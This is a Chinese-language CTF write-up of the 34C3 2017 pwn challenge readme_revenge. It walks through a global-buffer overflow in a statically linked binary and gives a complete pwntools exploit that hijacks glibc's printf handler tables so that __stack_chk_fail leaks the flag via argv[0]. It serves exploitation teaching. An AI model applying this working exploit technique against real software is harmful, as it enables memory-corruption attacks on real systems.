# 6.1.13 pwn 34C3CTF2017 readme_revenge

- [题目复现](#题目复现)
- [题目解析](#题目解析)
- [漏洞利用](#漏洞利用)
- [参考资料](#参考资料)

[下载文件](../src/writeup/6.1.13_pwn_34c3ctf2017_readme_revenge)

## 题目复现

这个题目实际上非常有趣。

```text
$ file readme_revenge
readme_revenge: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, for GNU/Linux 2.6.32, BuildID[sha1]=2f27d1b57237d1ab23f8d0fc3cd418994c5b443d, not stripped
$ checksec -f readme_revenge
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FORTIFY Fortified Fortifiable  FILE
Partial RELRO   Canary found      NX enabled    No PIE          No RPATH   No RUNPATH   Yes     3               45      readme_revenge
```

与我们经常接触的题目不同，这是一个静态链接程序，运行时不需要加载 libc。not stripped 绝对是个好消息。

```text
$ ./readme_revenge
aaaa
Hi, aaaa. Bye.
$ ./readme_revenge
%x.%d.%p
Hi, %x.%d.%p. Bye.
$ python -c 'print("A"*2000)' > crash_input
$ ./readme_revenge < crash_input
Segmentation fault (core dumped)
```

我们试着给它输入一些字符，结果被原样打印出来，而且看起来也不存在格式化字符串漏洞。但当我们输入大量字符时，触发了段错误，这倒是一个好消息。

接着又发现了这个：

```text
$ rabin2 -z readme_revenge | grep 34C3
Warning: Cannot initialize dynamic strings
000 0x000b4040 0x006b4040  35  36 (.data) ascii 34C3_XXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
```

看来 flag 是被隐藏在程序中的，地址在 `0x006b4040`，位于 `.data` 段上。结合题目的名字 readme，推测这题的目标应该是从程序中读取或者泄漏出 flag。

## 题目解析

因为 flag 在程序的 `.data` 段上，根据我们的经验，应该能想到利用 `__stack_chk_fail()` 将其打印出来（参考章节 4.12）。

main 函数如下：

```text
[0x00400900]> pdf @ main
            ;-- main:
/ (fcn) sym.main 80
|   sym.main (int arg_1020h);
|           ; arg int arg_1020h @ rsp+0x1020
|           ; DATA XREF from 0x0040091d (entry0)
|           0x00400a0d      55             push rbp
|           0x00400a0e      4889e5         mov rbp, rsp
|           0x00400a11      488da424e0ef.  lea rsp, [rsp - 0x1020]
|           0x00400a19      48830c2400     or qword [rsp], 0
|           0x00400a1e      488da4242010.  lea rsp, [arg_1020h]        ; 0x1020
|           0x00400a26      488d35b3692b.  lea rsi, obj.name           ; 0x6b73e0
|           0x00400a2d      488d3d50c708.  lea rdi, [0x0048d184]       ; "%s"
|           0x00400a34      b800000000     mov eax, 0
|           0x00400a39      e822710000     call sym.__isoc99_scanf
|           0x00400a3e      488d359b692b.  lea rsi, obj.name           ; 0x6b73e0
|           0x00400a45      488d3d3bc708.  lea rdi, str.Hi___s._Bye.   ; 0x48d187 ; "Hi, %s. Bye.\n"
|           0x00400a4c      b800000000     mov eax, 0
|           0x00400a51      e87a6f0000     call sym.__printf
|           0x00400a56      b800000000     mov eax, 0
|           0x00400a5b      5d             pop rbp
\           0x00400a5c      c3             ret
```

很简单，从标准输入读取字符串到变量 `name`，地址在 `0x6b73e0`，且位于 `.bss` 段上，是一个全局变量。接下来程序调用 printf 将 `name` 打印出来。

在 gdb 里试试：

```text
gdb-peda$ r < crash_input
Starting program: /home/firmy/Desktop/RE4B/readme/readme_revenge < crash_input

Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
RAX: 0x4141414141414141 ('AAAAAAAA')
RBX: 0x7fffffffd190 --> 0xffffffff
RCX: 0x7fffffffd160 --> 0x0
RDX: 0x73 ('s')
RSI: 0x0
RDI: 0x48d18b ("%s. Bye.\n")
RBP: 0x0
RSP: 0x7fffffffd050 --> 0x0
RIP: 0x45ad64 (<__parse_one_specmb+1300>:       cmp    QWORD PTR [rax+rdx*8],0x0)
R8 : 0x48d18b ("%s. Bye.\n")
R9 : 0x4
R10: 0x48d18c ("s. Bye.\n")
R11: 0x7fffffffd160 --> 0x0
R12: 0x0
R13: 0x7fffffffd190 --> 0xffffffff
R14: 0x48d18b ("%s. Bye.\n")
R15: 0x1
EFLAGS: 0x10206 (carry PARITY adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x45ad53 <__parse_one_specmb+1283>:  jmp    0x45ab95 <__parse_one_specmb+837>
   0x45ad58 <__parse_one_specmb+1288>:  nop    DWORD PTR [rax+rax*1+0x0]
   0x45ad60 <__parse_one_specmb+1296>:  movzx  edx,BYTE PTR [r10]
=> 0x45ad64 <__parse_one_specmb+1300>:  cmp    QWORD PTR [rax+rdx*8],0x0
   0x45ad69 <__parse_one_specmb+1305>:  je     0x45a944 <__parse_one_specmb+244>
   0x45ad6f <__parse_one_specmb+1311>:  lea    rdi,[rsp+0x8]
   0x45ad74 <__parse_one_specmb+1316>:  mov    rsi,rbx
   0x45ad77 <__parse_one_specmb+1319>:  addr32 call 0x44cfa0 <__handle_registered_modifier_mb>
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffd050 --> 0x0
0008| 0x7fffffffd058 --> 0x48d18c ("s. Bye.\n")
0016| 0x7fffffffd060 --> 0x0
0024| 0x7fffffffd068 --> 0x0
0032| 0x7fffffffd070 --> 0x7fffffffd5e0 --> 0x7fffffffdb90 --> 0x7fffffffdc80 --> 0x4014a0 (<__libc_csu_init>:        push   r15)
0040| 0x7fffffffd078 --> 0x7fffffffd190 --> 0xffffffff
0048| 0x7fffffffd080 --> 0x7fffffffd190 --> 0xffffffff
0056| 0x7fffffffd088 --> 0x443153 (<printf_positional+259>:     mov    r14,QWORD PTR [r12+0x20])
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x000000000045ad64 in __parse_one_specmb ()
gdb-peda$ x/8gx &name
0x6b73e0 <name>:        0x4141414141414141      0x4141414141414141
0x6b73f0 <name+16>:     0x4141414141414141      0x4141414141414141
0x6b7400 <_dl_tls_static_used>: 0x4141414141414141      0x4141414141414141
0x6b7410 <_dl_tls_max_dtv_idx>: 0x4141414141414141      0x4141414141414141
```

程序的漏洞很明显了，就是缓冲区溢出覆盖了 libc 静态编译到程序里的一些指针。再往下看会发现一些可能有用的：

```text
gdb-peda$
0x6b7978 <__libc_argc>: 0x4141414141414141
gdb-peda$
0x6b7980 <__libc_argv>: 0x4141414141414141
gdb-peda$
0x6b7a28 <__printf_function_table>:     0x4141414141414141
gdb-peda$
0x6b7a30 <__printf_modifier_table>:     0x4141414141414141
gdb-peda$
0x6b7aa8 <__printf_arginfo_table>:      0x4141414141414141
gdb-peda$
0x6b7ab0 <__printf_va_arg_table>:       0x4141414141414141
```

再看一下栈回溯情况吧：

```text
gdb-peda$ bt
#0  0x000000000045ad64 in __parse_one_specmb ()
#1  0x0000000000443153 in printf_positional ()
#2  0x0000000000446ed2 in vfprintf ()
#3  0x0000000000407a74 in printf ()
#4  0x0000000000400a56 in main ()
#5  0x0000000000400c84 in generic_start_main ()
#6  0x0000000000400efd in __libc_start_main ()
#7  0x000000000040092a in _start ()
```

依次调用了 `printf() => vfprintf() => printf_positional() => __parse_one_specmb()`。那就看一下 glibc 源码，然后发现了这个：

```c
// stdio-common/vfprintf.c

  /* Use the slow path in case any printf handler is registered.  */
  if (__glibc_unlikely (__printf_function_table != NULL
			|| __printf_modifier_table != NULL
			|| __printf_va_arg_table != NULL))
    goto do_positional;
```

```c
// stdio-common/printf-parsemb.c

  /* Get the format specification.  */
  spec->info.spec = (wchar_t) *format++;
  spec->size = -1;
  if (__builtin_expect (__printf_function_table == NULL, 1)
      || spec->info.spec > UCHAR_MAX
      || __printf_arginfo_table[spec->info.spec] == NULL
      /* We don't try to get the types for all arguments if the format
	 uses more than one.  The normal case is covered though.  If
	 the call returns -1 we continue with the normal specifiers.  */
      || (int) (spec->ndata_args = (*__printf_arginfo_table[spec->info.spec])
				   (&spec->info, 1, &spec->data_arg_type,
				    &spec->size)) < 0)
    {
```

这里就涉及到 glibc 的一个特性，它允许用户为 printf 的模板字符串（template strings）定义自己的转换函数，方法是使用函数 `register_printf_function()`：

```c
// stdio-common/printf.h

extern int register_printf_function (int __spec, printf_function __func,
				     printf_arginfo_function __arginfo)
  __THROW __attribute_deprecated__;
```

- 该函数为指定的字符 `__spec` 定义一个转换规则。因此如果 `__spec` 是 `Y`，它定义的转换规则就是 `%Y`。用户甚至可以重新定义已有的字符，例如 `%s`。
- `__func` 是一个函数，在对指定的 `__spec` 进行转换时由 `printf` 调用。
- `__arginfo` 也是一个函数，在对指定的 `__spec` 进行转换时由 `parse_printf_format` 调用。

想一下，在程序的 main 函数中，使用 `%s` 调用了 `printf`，如果我们能重新定义一个转换规则，就能做利用 `__func` 做我们想做的事情。然而我们并不能直接调用 `register_printf_function()`。那么，如果利用溢出修改 `__printf_function_table` 呢，这当然是可以的。

`register_printf_function()` 其实也就是 `__register_printf_specifier()`，我们来看看它是怎么实现的：

```c
// stdio-common/reg-printf.c

/* Register FUNC to be called to format SPEC specifiers.  */
int
__register_printf_specifier (int spec, printf_function converter,
			     printf_arginfo_size_function arginfo)
{
  if (spec < 0 || spec > (int) UCHAR_MAX)
    {
      __set_errno (EINVAL);
      return -1;
    }

  int result = 0;
  __libc_lock_lock (lock);

  if (__printf_function_table == NULL)
    {
      __printf_arginfo_table = (printf_arginfo_size_function **)
	calloc (UCHAR_MAX + 1, sizeof (void *) * 2);
      if (__printf_arginfo_table == NULL)
	{
	  result = -1;
	  goto out;
	}

      __printf_function_table = (printf_function **)
	(__printf_arginfo_table + UCHAR_MAX + 1);
    }

  __printf_function_table[spec] = converter;
  __printf_arginfo_table[spec] = arginfo;

 out:
  __libc_lock_unlock (lock);

  return result;
}
```

然后发现 `spec` 被直接用做数组 `__printf_function_table` 和 `__printf_arginfo_table` 的下标。`s` 也就是 `0x73`，这和我们在 gdb 里看到的相符：`rdx=0x73`，`[rax+rdx*8]`正好是数组取值的方式，虽然这里的 `rax` 里保存的是 `__printf_modifier_table`。

## 漏洞利用

有了上面的分析，下面我们来构造 exp。

回顾一下 `__parse_one_specmb()` 函数里的 `if` 判断语句，我们知道 C 语言对 `||` 的处理机制是如果第一个表达式为 True，就不再进行第二个表达式的判断，所以为了执行函数 `*__printf_arginfo_table[spec->info.spec]`，需要前面的判断条件都为 False。我们可以在 `.bss` 段上伪造一个 `printf_arginfo_size_function` 结构体，在结构体偏移 `0x73*8` 的地方放上 `__stack_chk_fail()` 的地址，当该函数执行时，将打印出 `argv[0]` 指向的字符串，所以我们还需要将 `argv[0]` 覆盖为 flag 的地址。

Bingo!!!

```text
$ python2 exp.py
[+] Starting local process './readme_revenge': pid 14553
[*] Switching to interactive mode
*** stack smashing detected ***: 34C3_XXXXXXXXXXXXXXXXXXXXXXXXXXXXXX terminated
```

### exploit

完整的 exp 如下：

```python
from pwn import *

io = process('./readme_revenge')

flag_addr = 0x6b4040
name_addr = 0x6b73e0
argv_addr = 0x6b7980
func_table = 0x6b7a28
arginfo_table = 0x6b7aa8
stack_chk_fail = 0x4359b0

payload  = p64(flag_addr)       # name
payload  = payload.ljust(0x73 * 8, "\x00")
payload += p64(stack_chk_fail)  # __printf_arginfo_table[spec->info.spec]
payload  = payload.ljust(argv_addr - name_addr, "\x00")
payload += p64(name_addr)       # argv
payload  = payload.ljust(func_table - name_addr, "\x00")
payload += p64(name_addr)       # __printf_function_table
payload  = payload.ljust(arginfo_table - name_addr, "\x00")
payload += p64(name_addr)       # __printf_arginfo_table

# with open("./payload", "wb") as f:
#     f.write(payload)

io.sendline(payload)
io.interactive()
```

## 参考资料

- <https://ctftime.org/task/5135>
- [Customizing printf](https://www.gnu.org/software/libc/manual/html_node/Customizing-Printf.html)
